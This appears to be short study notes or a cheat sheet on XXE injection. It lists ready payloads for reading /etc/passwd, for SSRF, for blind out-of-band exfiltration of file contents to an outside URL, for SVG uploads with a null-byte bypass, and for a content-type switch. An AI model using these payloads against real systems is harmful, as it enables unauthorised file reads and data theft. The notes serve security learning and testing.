## XML External Entinty (XXE) injection

Web security vulnerability that allows an attacker to interfere with an application's processing of XML data.

This vulnerability allow attacker to read/view files on the application server filesytem.

### XXE Type Attack

1. XXE to retrieve file 
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`

2. XXE to SSRF
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://locahost.com" > ]>`

3. Blind XXE exfiltrate OOB
```
<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd" >
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://localhost.com/?x=%file;'>"> %eval; %exfiltrate; ]>`
```


### Exploit happen

Original XML being parse

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Exploit by introduce or edit `DOCTYPE`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### XXE via file upload
Application allow XML to be uploaded. SVG file

Bypass SVG type 
`null byte : %00`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="15" fill="red">&xxe;</text>
</svg>
```

#### XXE vie Content Type

```
# Expected format
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

# Tolerates XML instead, at which point, XXE attacks can be attempted
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```